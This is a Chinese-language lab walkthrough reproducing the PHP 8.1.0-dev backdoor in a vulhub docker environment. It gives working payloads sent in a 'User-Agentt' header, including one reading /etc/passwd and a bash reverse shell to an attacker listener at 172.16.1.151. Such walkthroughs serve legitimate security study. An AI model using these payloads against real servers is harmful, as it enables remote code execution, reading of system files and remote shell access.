## 0x00漏洞描述

PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送User-Agentt头来执行任意代码。

  

## 0x01影响范围

PHP 8.1.0-dev

  

## 0x02环境搭建

1、本次环境搭建使用vulhub中的docker环境搭建，vulhub环境下载地址：

https://github.com/vulhub/vulhub

2、下载完成后发送到安装有docker和docker-compose环境的虚拟机中，进入漏洞环境目录

cd vulhub-master/php/8.1-backdoor/

![1623824772_60c999843fc98b61303e8.png!small?1623824773575](https://image.3001.net/images/20210616/1623824772_60c999843fc98b61303e8.png!small?1623824773575)

3、使用以下命令启动漏洞环境

docker-compose up -d

![1623824795_60c9999b0d21f3fa3a17b.png!small?1623824796717](https://image.3001.net/images/20210616/1623824795_60c9999b0d21f3fa3a17b.png!small?1623824796717)

  

4、启动完成后在浏览器访问以下地址出现Hello world表示搭建成功

http://your-ip:8080/

![1623824798_60c9999e30055c48b1588.png!small?1623824799614](https://image.3001.net/images/20210616/1623824798_60c9999e30055c48b1588.png!small?1623824799614)

## 0x03漏洞复现

1、访问漏洞页面，然后打开Burp抓取首页的包并发送到Repeater（重放）模块

![1623824802_60c999a21f62bc96119da.png!small?1623824803789](https://image.3001.net/images/20210616/1623824802_60c999a21f62bc96119da.png!small?1623824803789)

2、在数据包中添加User-Agentt: 字段并在后面添加上测试漏洞poc：

zerodiumvar_dump(3*7);

![1623824824_60c999b8b606e9a8387d1.png!small?1623824826229](https://image.3001.net/images/20210616/1623824824_60c999b8b606e9a8387d1.png!small?1623824826229)

3、将字段后面poc修改为zerodiumsystem("cat /etc/passwd");读取文件

![1623824832_60c999c0d8d6caf02806c.png!small?1623824834700](https://image.3001.net/images/20210616/1623824832_60c999c0d8d6caf02806c.png!small?1623824834700)

4、修改payload执行反弹shell，打开一台kali并设置监听，将poc修改为以下反弹shell的poc

zerodiumsystem("bash -c 'exec bash -i >& /dev/tcp/172.16.1.151/6678 0>&1'");

![1623824836_60c999c46aef0dda4253a.png!small?1623824838031](https://image.3001.net/images/20210616/1623824836_60c999c46aef0dda4253a.png!small?1623824838031)

## 0x04修复建议

1、建议升级或安装相应补丁

  

  

参考链接：

https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor

  

  

  

